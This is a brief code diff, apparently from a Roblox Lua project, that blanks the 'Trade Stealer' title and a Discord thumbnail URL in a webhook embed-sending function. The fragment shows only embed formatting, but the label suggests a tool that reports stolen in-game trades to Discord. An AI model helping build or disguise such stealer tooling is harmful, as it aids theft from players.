@@ -206,7 +206,7 @@ function DYWebhookServices:Send(data)
 
 	for _, embed in pairs(embeds) do
 		local embedData = {
-			title = "Trade Stealer",
+			title = "",
 			description = embed.Info.Embed.Description or "",
 			type = embed.Info.Settings.Type or "rich",
 			color = embed.Info.Settings.Color or "",
@@ -215,7 +215,7 @@ function DYWebhookServices:Send(data)
 				url = "",
 			},
 			thumbnail = {
-				url = "https://cdn.discordapp.com/attachments/1265729577804894299/1284863057800986645/IMG_20240915_100657.jpg?ex=66e82d78&is=66e6dbf8&hm=950b284b92502a487b994297dce1882f78f88754f2ebe6e0177df058dcdc4322&",
+				url = "",
 			},
 			timestamp = os.date("!%Y-%m-%dT%H:%M:%S", os.time(embed.Info.Embed.TimeStamp)) or "",
 			footer = {
